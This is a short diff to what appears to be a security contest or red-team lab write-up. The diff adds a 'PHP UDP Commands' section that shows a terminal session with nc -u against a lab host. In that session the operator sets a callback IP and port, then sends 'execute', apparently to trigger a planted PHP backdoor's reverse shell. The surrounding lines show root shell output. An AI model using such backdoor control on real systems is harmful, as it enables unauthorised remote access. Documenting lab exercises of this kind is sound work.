@@ -48,3 +48,16 @@ The Private SSH key loaded will be distributed through another channel.
   Connected!
   uid=0(root) gid=0(root) groups=0(root)
   ```
+!! PHP UDP Commands
+  * ```
+  ┌──(root㉿dragon)-[~/UnnamedSecurityContest/Beachhead]
+└─# nc -u 10.10.1.36 10000
+ip 10.10.1.34
+10.10.1.34
+port 9001
+9001
+status
+IP: 10.10.1.34 Port: 9001
+execute
+
+```
